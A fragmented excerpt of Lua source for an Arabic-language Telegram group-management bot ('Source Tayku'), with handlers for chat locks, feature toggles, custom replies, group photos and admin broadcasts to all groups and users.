if text == "التوجيه" or text == "اعاده التوجيه" then if DevLeo:get(Tayku..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الاغاني" then if DevLeo:get(Tayku..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevLeo:get(Tayku..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevLeo:get(Tayku..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الماركداون" then if DevLeo:get(Tayku..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الهاشتاك" then if DevLeo:get(Tayku..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "التعديل" then if DevLeo:get(Tayku..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "التثبيت" then if DevLeo:get(Tayku..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الاشعارات" then if DevLeo:get(Tayku..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الكلايش" then if DevLeo:get(Tayku..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الدخول" then if DevLeo:get(Tayku..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local TaykuTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الشبكات" then if DevLeo:get(Tayku..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "المواقع" then if DevLeo:get(Tayku..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "العربيه" then if DevLeo:get(Tayku..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الانكليزيه" then if DevLeo:get(Tayku..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local TaykuTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الكفر" then if DevLeo:get(Tayku..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local TaykuTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الفشار" then if DevLeo:get(Tayku..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local TaykuTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
if text == "الطائفيه" then if DevLeo:get(Tayku..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local TaykuTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, TaykuTeam, 1, 'md') end
end
--     Source Tayku     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source Tayku     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source Tayku     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Tayku     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Tayku     --
if RioSudo(msg) then
...
--     Source Tayku     --
if msg.content_.photo_ then
if DevLeo:get(Tayku..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevLeo:del(Tayku..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevLeo:del(Tayku..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevLeo:set(Tayku..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Tayku     --
...
if data.ID == "Ok" then
DevLeo:del(Tayku..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevLeo:get(Tayku..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevLeo:del(Tayku..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevLeo:scard(Tayku.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevLeo:scard(Tayku.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevLeo:scard(Tayku.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevLeo:scard(Tayku.."Rio:Managers:"..ChatId) or 0
local MutedList = DevLeo:scard(Tayku.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevLeo:scard(Tayku.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevLeo:scard(Tayku.."Rio:Admins:"..ChatId) or 0
local VipList = DevLeo:scard(Tayku.."Rio:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/lllEll0' end
...
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "lllEll0")..")"
else 
...
ChatLeave(dp.id_, Tayku)
DevLeo:srem(Tayku.."Rio:Groups", dp.id_)
else
...
DevLeo:set(Tayku..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:FreeBot'..Tayku) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:FreeBot'..Tayku,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source Tayku     --
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevLeo:sadd(Tayku.."Rio:Groups",msg.chat_id_)
if not DevLeo:get(Tayku..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevLeo:incrby(Tayku..'Rio:Sudos'..msg.sender_user_id_,1)
DevLeo:set(Tayku..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevLeo:sismember(Tayku..'Rio:Groups',msg.chat_id_) then
...
local Text = "᥀︙Source Tayku\n᥀︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevLeo:scard(Tayku.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevLeo:scard(Tayku.."Rio:Admins:"..v) or 0
local Groupslink = DevLeo:get(Tayku.."Rio:Groups:Links" ..v)
...
DevLeo:setex(Tayku.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevLeo:get(Tayku.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevLeo:del(Tayku.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevLeo:smembers(Tayku..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevLeo:setex(Tayku.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevLeo:get(Tayku.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevLeo:del(Tayku.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevLeo:smembers(Tayku..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevLeo:setex(Tayku.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevLeo:get(Tayku.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevLeo:del(Tayku.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevLeo:smembers(Tayku..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevLeo:setex(Tayku.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevLeo:get(Tayku.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevLeo:del(Tayku.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevLeo:smembers(Tayku..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevLeo:setex(Tayku.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevLeo:get(Tayku.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevLeo:del(Tayku.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevLeo:smembers(Tayku.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevLeo:set(Tayku..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevLeo:get(Tayku..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevLeo:smembers(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevLeo:set(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevLeo:sismember(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevLeo:set(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevLeo:set(Tayku..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevLeo:set(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevLeo:set(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevLeo:get(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevLeo:set(Tayku..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevLeo:set(Tayku..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevLeo:sadd(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source Tayku     --
...
local List = DevLeo:smembers(Tayku..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevLeo:set(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevLeo:set(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevLeo:get(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevLeo:set(Tayku..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevLeo:set(Tayku..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevLeo:sadd(Tayku..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevLeo:set(Tayku..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source Tayku     --
...
local List = DevLeo:smembers(Tayku.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevLeo:set(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevLeo:set(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevLeo:get(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevLeo:set(Tayku.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevLeo:set(Tayku.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevLeo:sadd(Tayku.."Rio:Sudo:AllRed",text)
DevLeo:set(Tayku.."DelSudoRep",text)
return false 
end end
--     Source Tayku     --
...
local redod = DevLeo:smembers(Tayku..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevLeo:smembers(Tayku..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
